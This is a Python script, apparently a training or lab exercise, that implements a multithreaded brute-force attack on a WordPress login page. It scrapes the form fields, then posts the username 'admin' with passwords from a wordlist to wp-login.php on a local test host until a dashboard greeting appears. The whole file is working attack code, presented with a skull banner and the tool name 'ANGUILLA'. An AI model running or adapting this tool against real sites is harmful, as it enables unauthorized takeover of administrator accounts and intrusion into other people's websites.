from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

def print_banner():
    skull = f"""{Fore.RED}
                 ______
              .-"      "-.
             /            \\
            |              |
            |,  .-.  .-.  ,|
            | )(__/  \__)( |
            |/     /\     \|
            (_     ^^     _)
             \__|IIIIII|__/
              | \IIIIII/ |
              \          /
               `--------`
    {Style.RESET_ALL}"""
    
    name = f"{Fore.RED}{Style.BRIGHT}{'=' * 40}\n{' ' * 15}ANGUILLA\n{'=' * 40}{Style.RESET_ALL}"
    
    print(skull)
    print(name)

SUCCESS = 'Bienvenue sur votre Tableau de bord WordPress !'
TARGET = "http://testsite.local/wp-login.php"
WORDLIST = 'cain-and-abel.txt'
GREEN = '\033[92m'  
RESET = '\033[0m'
RED = '\033[91m'
file_lock=threading.Lock()


def get_words():
    with open(WORDLIST) as f:
    	 raw_words = f.read()
    
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    f.close()
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree   = etree.parse(BytesIO(content),parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None :
           params[name]=elem.get('value',None)
    return params  

class Bruter:
      def __init__(self,username,url):
          self.username = username
          self.url = url
          self.found = False
          print(f'\n Brute Force Attack beginning on {url} \n')
          print("Finished the setup where username = %s\n"%username)
      
      def run_bruteforce(self,passwords):
          for _ in range(10):
              t = threading.Thread(target=self.web_bruter,args=(passwords,))
              t.start()
      def web_bruter(self,passwords):
          session = requests.Session()
          resp0 = session.get(self.url)
          params = get_params(resp0.content)
          params['log'] = self.username
      
          while not passwords.empty() and not self.found:
                time.sleep(5)
                passwd = passwords.get()
                print(f'Trying username/password {self.username}/{passwd:<10}')
                params['pwd']=passwd
		
                resp1 = session.post(self.url,data=params)
                if SUCCESS in resp1.content.decode():
                	self.found=True
                	print(f"\n{GREEN}Bruteforcing successful.{RESET}")
                	print("\t Username is %s"%self.username)
                	print("\t Password is %s\n"%passwd)
                	print('\t done: now cleaning up other threads ...')

if __name__ == '__main__':
   print_banner()
   words = get_words()
   b = Bruter('admin',TARGET)
   b.run_bruteforce(words)
